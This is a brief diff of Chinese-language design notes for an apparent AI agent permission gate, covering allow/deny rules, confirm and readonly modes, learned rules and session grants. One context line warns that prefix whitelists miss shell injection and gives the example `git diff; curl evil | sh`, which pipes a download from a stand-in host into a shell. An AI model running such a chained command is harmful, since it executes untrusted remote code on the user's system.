@@ -270,7 +270,7 @@ gate 签发 confirmationId（newId("conf")，前缀 + 单调 ULID——按时间
 ## 边界与出错
 
 - **deny 不防 shell 注入**：exec 的规则匹配的是命令字符串本身，`exec:git diff*` 同样命中 `git diff; curl evil | sh`。白名单只应放前缀可信的命令；真正的防线是默认的 confirm 档——人工可查看完整命令。
-- **readonly 模式短路一切放行路径**：包括 allow 白名单、沉淀规则与会话授权；它不是一条 deny 规则（写不进 config），而是会话模式开关。
+- **readonly 模式短路一切放行路径**：包括 allow 白名单、沉淀规则与会话授权；它是会话模式开关，不写入 config 规则文件。
 - **沉淀规则的授权范围以工作区为界**：learned 放行只在目标不逃逸工作区时生效（与 allow 同一豁免规则）；exec 沉淀规则保存时收紧为首词 + 子命令前缀，删除规则或整个文件即收回授权。
 - **规则大小写敏感**，`*` 之外无其它通配符（`?`、`[]` 都是字面字符）。
 - **SessionGrants 是进程内存且单 run 有效**：每 run 新建、run 结束即弃，daemon 重启即清空；且历史 grantedBy 记录不受影响（那是持久化在会话日志里的）。
